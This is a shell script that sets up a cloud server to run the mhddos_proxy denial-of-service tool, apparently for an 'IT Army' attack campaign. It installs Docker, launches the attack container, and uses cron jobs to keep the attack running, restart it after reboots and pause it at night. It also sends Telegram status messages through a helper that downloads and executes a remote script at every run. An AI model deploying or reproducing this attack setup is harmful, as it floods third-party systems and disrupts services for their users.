#!/bin/sh

##### CHANGE LINES BELOW #####
TG_TOKEN="YOUR TELEGRAM TOKEN"      # Specify your TG token
TG_CHAT_ID="YOUR TELEGRAM CHAT ID"  # Specify your TG chat ID
NOTIFY_EVERY_HOUR=2                 # Notify every X hours
NIGHT_SILENCE=true                  # If 'true', disable attack between 1AM and 8AM MSK (for costs saving)
DIGITALOCEAN_TOKEN=""               # Specify DO API key to see Account Balance (or you can keep it empty)
##############################

# Install requirements
apt-get install -y jq

wget -O - https://get.docker.com/ | bash
systemctl enable docker.service
systemctl start docker.service

mkdir -p /root/.docker/cli-plugins
curl -SL https://github.com/docker/compose/releases/download/v2.2.3/docker-compose-linux-x86_64 -o /root/.docker/cli-plugins/docker-compose
chmod +x /root/.docker/cli-plugins/docker-compose

# Generate files
cd /root/

cat > docker-compose.yaml <<'EOF'
version: "3"
services:
  mhddos:
    image: ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest
    restart: unless-stopped
    command: --itarmy --debug --lang en
EOF

cat > tg.sh <<EOF
#!/bin/bash

set -x

TG_TOKEN=$TG_TOKEN
TG_CHAT_ID=$TG_CHAT_ID
NIGHT_SILENCE=$NIGHT_SILENCE
DIGITALOCEAN_TOKEN=$DIGITALOCEAN_TOKEN

# Download and execute the latest version of tg.sh file
tmpfile=$(mktemp)
curl -Ls https://raw.githubusercontent.com/sadviq99/mhddos_proxy-setup/master/tg.sh > \$tmpfile
source \$tmpfile
rm \$tmpfile
EOF
chmod u+x tg.sh

# Run mhddos_proxy
docker compose up -d

# Setup schedule of start, stop, and notifications
> cronjob
if [ "$NIGHT_SILENCE" = true ]; then
cat > cronjob <<EOF
# Shutdown the process at 22 UTC (1AM MSK) time
0 22 * * * cd /root && docker compose down
# Turn on the process at 5 UTC (8AM MSK) time
0 5 * * * cd /root && docker compose up -d
# Send notifications every $NOTIFY_EVERY_HOUR hours 
0 7-20/$NOTIFY_EVERY_HOUR * * * cd /root/ && /bin/bash tg.sh > tg.log 2>&1
# Restart the process every 2 hours
15 7-20/2 * * * cd /root && docker compose down && docker compose pull && docker compose up -d
# Start the process automatically after reboot
@reboot cd /root && docker compose down && docker compose pull && docker compose up -d
EOF
else 
cat > cronjob <<EOF
# Send notifications every $NOTIFY_EVERY_HOUR hours
0 */$NOTIFY_EVERY_HOUR * * * cd /root/ && /bin/bash tg.sh > tg.log 2>&1
# Restart the process every 2 hours
15 */2 * * * cd /root && docker compose down && docker compose pull && docker compose up -d
# Start the process automatically after reboot
@reboot cd /root && docker compose down && docker compose pull && docker compose up -d
EOF
fi
crontab cronjob
